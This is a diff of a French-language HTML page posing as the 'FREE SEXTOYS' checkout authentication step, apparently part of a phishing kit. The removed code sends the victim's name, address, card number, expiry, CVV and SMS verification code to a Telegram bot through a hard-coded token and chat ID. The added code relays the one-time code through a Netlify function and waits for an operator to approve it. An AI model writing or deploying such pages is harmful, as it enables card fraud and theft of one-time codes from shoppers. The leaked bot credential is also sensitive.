@@ -2,213 +2,151 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>FREE SEXTOYS - Authentification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Sextoys - Authentification</title>
     <style>
         body {
-            background: linear-gradient(135deg, #1A2526 0%, #2C3E50 100%);
-            color: #FFFFFF;
-            font-family: 'Roboto', Arial, sans-serif;
+            font-family: Arial, sans-serif;
+            background-color: #1a2a44;
             margin: 0;
-            padding: 0;
+            padding: 20px;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
-        nav {
-            background: #131921;
-            padding: 15px;
-            text-align: center;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-        }
-        nav h1 {
-            color: #FF6200;
-            margin: 0;
-            font-size: 28px;
-            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
-        }
-        .progress {
-            text-align: center;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 25px;
-            margin: 10px 0;
-        }
-        .progress span {
-            display: inline-block;
-            width: 40px;
-            height: 40px;
-            line-height: 40px;
-            border-radius: 50%;
-            margin: 0 15px;
-            background: #FF6200;
-            color: #FFFFFF;
-            font-weight: bold;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-            transition: transform 0.3s ease;
-        }
-        .progress span.inactive {
-            background: #666;
-            transform: scale(0.8);
-        }
-        .container {
-            max-width: 600px;
-            margin: 30px auto;
-            padding: 30px;
-            border-radius: 20px;
-            background: #FFFFFF;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
-            text-align: center;
-            transition: transform 0.3s ease;
-        }
-        .container:hover {
-            transform: translateY(-5px);
-        }
-        input {
+        .header {
             width: 100%;
-            padding: 12px;
-            margin: 15px 0;
-            background: #F5F5F5;
-            border: 1px solid #888;
-            color: #0F1111;
-            border-radius: 10px;
-            font-size: 16px;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            max-width: 1200px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
         }
-        input:focus {
-            border-color: #FF6200;
-            box-shadow: 0 0 8px rgba(255, 98, 0, 0.3);
-            outline: none;
+        .header h1 {
+            color: #ff0000;
+            font-size: 24px;
+            font-weight: bold;
+            margin: 0;
         }
-        button {
-            background: #FF6200;
+        .steps {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .step {
+            width: 30px;
+            height: 30px;
+            background-color: #4a5b7c;
+            color: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .step.active {
+            background-color: #ff6200;
+        }
+        .form-container {
+            background-color: #fff;
+            border-radius: 8px;
+            padding: 20px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .form-container h2 {
+            color: #ff6200;
+            font-size: 18px;
+            margin: 0 0 20px;
+        }
+        .form-container label {
+            display: block;
+            color: #111;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .form-container input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .form-container button {
+            background-color: #ff6200;
+            color: #fff;
             border: none;
-            padding: 15px;
-            color: #FFFFFF;
+            padding: 10px;
+            font-size: 14px;
+            border-radius: 4px;
             cursor: pointer;
             width: 100%;
-            border-radius: 25px;
-            font-size: 18px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            transition: background 0.3s ease, transform 0.2s ease;
-        }
-        button:hover {
-            background: #E55A00;
-            transform: scale(1.02);
-            box-shadow: 0 0 15px #FF6200;
-        }
-        p {
-            color: #0F1111;
-            font-size: 16px;
-            line-height: 1.5;
         }
     </style>
 </head>
 <body>
-    <nav><h1 id="title">FREE SEXTOYS - Authentification</h1></nav>
-    <div class="progress">
-        <span class="inactive">1</span><span class="inactive">2</span><span class="inactive">3</span><span>4</span><span class="inactive">5</span>
+    <div class="header">
+        <h1>FREE SEXTOYS</h1>
     </div>
-    <div class="container">
-        <p id="message">Pour sécuriser votre commande chez FREE SEXTOYS, vous allez recevoir un code de vérification par SMS sur votre numéro de téléphone ou par email. Veuillez entrer ce code ci-dessous pour valider votre achat.</p>
-        <input type="text" placeholder="Entrez le code (6 chiffres)" id="code" maxlength="6">
-        <button id="validateBtn" onclick="sendToTelegram()">Valider</button>
+    <div class="steps">
+        <div class="step">1</div>
+        <div class="step">2</div>
+        <div class="step">3</div>
+        <div class="step active">4</div>
+        <div class="step">5</div>
+    </div>
+    <div class="form-container">
+        <h2>Authentication</h2>
+        <form id="authForm">
+            <label for="authCode">Authentication Code</label>
+            <input type="text" id="authCode" placeholder="Enter your authentication code" required>
+            <button type="submit">Confirmer</button>
+        </form>
     </div>
 
     <script>
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                const country = data.country_code;
-                let lang = 'en';
-                if (country === 'FR') lang = 'fr';
-                if (country === 'DE') lang = 'de';
-                changeLanguage(lang);
-            })
-            .catch(error => {
-                console.error('Erreur lors de la détection de langue :', error);
-                changeLanguage('en');
+        document.getElementById('authForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const authCode = document.getElementById('authCode').value;
+
+            const message = `Code d'authentification: ${authCode}\n\nConfirmez-vous ce code ?`;
+
+            const response = await fetch('/.netlify/functions/telegram-webhook', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    message: message,
+                    page: 'page4' // Indique que c'est pour la page d'authentification
+                })
             });
 
-        function changeLanguage(lang) {
-            const title = document.getElementById('title');
-            const message = document.getElementById('message');
-            const validateBtn = document.getElementById('validateBtn');
-            const codeInput = document.getElementById('code');
+            // Ne pas afficher la réponse, démarrer la vérification de la réponse Telegram
+            checkTelegramResponse();
+        });
 
-            if (lang === 'fr') {
-                title.textContent = 'FREE SEXTOYS - Authentification';
-                message.textContent = 'Pour sécuriser votre commande chez FREE SEXTOYS, vous allez recevoir un code de vérification par SMS sur votre numéro de téléphone ou par email. Veuillez entrer ce code ci-dessous pour valider votre achat.';
-                validateBtn.textContent = 'Valider';
-                codeInput.placeholder = 'Entrez le code (6 chiffres)';
-            } else if (lang === 'en') {
-                title.textContent = 'FREE SEXTOYS - Authentication';
-                message.textContent = 'To secure your order with FREE SEXTOYS, you will receive a verification code via SMS to your phone number or email. Please enter the code below to validate your purchase.';
-                validateBtn.textContent = 'Validate';
-                codeInput.placeholder = 'Enter the code (6 digits)';
-            } else if (lang === 'de') {
-                title.textContent = 'FREE SEXTOYS - Authentifizierung';
-                message.textContent = 'Um Ihre Bestellung bei FREE SEXTOYS zu sichern, erhalten Sie einen Verifizierungscode per SMS an Ihre Telefonnummer oder per E-Mail. Bitte geben Sie den Code unten ein, um Ihren Kauf zu bestätigen.';
-                validateBtn.textContent = 'Bestätigen';
-                codeInput.placeholder = 'Code eingeben (6 Ziffern)';
-            }
-        }
+        async function checkTelegramResponse() {
+            const interval = setInterval(async () => {
+                const response = await fetch('/.netlify/functions/check-response?page=page4');
+                const data = await response.json();
 
-        function sendToTelegram() {
-            const auth = { code: document.getElementById('code').value };
-            localStorage.setItem('auth', JSON.stringify(auth));
-
-            const selectedItems = JSON.parse(localStorage.getItem('selectedItems')) || [];
-            const userInfos = JSON.parse(localStorage.getItem('userInfos')) || {};
-            const paiement = {
-                adresseLivraison: localStorage.getItem('adresseLivraison') || '',
-                numeroDestinataire: localStorage.getItem('numeroDestinataire') || '',
-                titulaire: localStorage.getItem('titulaire') || '',
-                carte: localStorage.getItem('carte') || '',
-                expiration: localStorage.getItem('expiration') || '',
-                cvv: localStorage.getItem('cvv') || ''
-            };
-
-            const message = `Données des Pages 1 à 4 - FREE SEXTOYS\n\n` +
-                           `Articles choisis (Page 1):\n${selectedItems.length > 0 ? selectedItems.join(', ') : 'Aucun article sélectionné'}\n\n` +
-                           `Informations personnelles (Page 2):\n` +
-                           `Nom: ${userInfos.nom || ''}\n` +
-                           `Email: ${userInfos.email || ''}\n` +
-                           `Téléphone: ${userInfos.telephone || ''}\n` +
-                           `Pays: ${userInfos.pays || ''}\n` +
-                           `Ville: ${userInfos.ville || ''}\n` +
-                           `Code postal: ${userInfos.codepostal || ''}\n` +
-                           `Adresse: ${userInfos.adresse || ''}\n\n` +
-                           `Paiement (Page 3):\n` +
-                           `Adresse de livraison: ${paiement.adresseLivraison || ''}\n` +
-                           `Numéro de destinataire: ${paiement.numeroDestinataire || ''}\n` +
-                           `Nom du titulaire: ${paiement.titulaire || ''}\n` +
-                           `Numéro de carte: ${paiement.carte || ''}\n` +
-                           `Date d'expiration: ${paiement.expiration || ''}\n` +
-                           `CVV: ${paiement.cvv || ''}\n\n` +
-                           `Authentification (Page 4):\n` +
-                           `Code: ${auth.code || ''}`;
-
-            const token = '7966565424:AAGTSMjFqmYkI-Kd1jiccJWtRzPfSdZ_VAA';
-            const chatId = '1191944530';
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: 'Oui', callback_data: 'yes_pages1to4' }, { text: 'Non', callback_data: 'no_pages1to4' }]
-                        ]
+                if (data.action) {
+                    clearInterval(interval);
+                    if (data.action === 'yes') {
+                        window.location.href = 'summary.html';
+                    } else if (data.action === 'no') {
+                        alert('Authentification refusée. Veuillez réessayer.');
+                        window.location.href = 'authentication.html';
                     }
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert('Données envoyées à Telegram !');
-                window.location.href = 'summary.html';
-            })
-            .catch(error => alert('Erreur lors de l\'envoi à Telegram : ' + error));
+                }
+            }, 2000); // Vérifie toutes les 2 secondes
         }
     </script>
 </body>
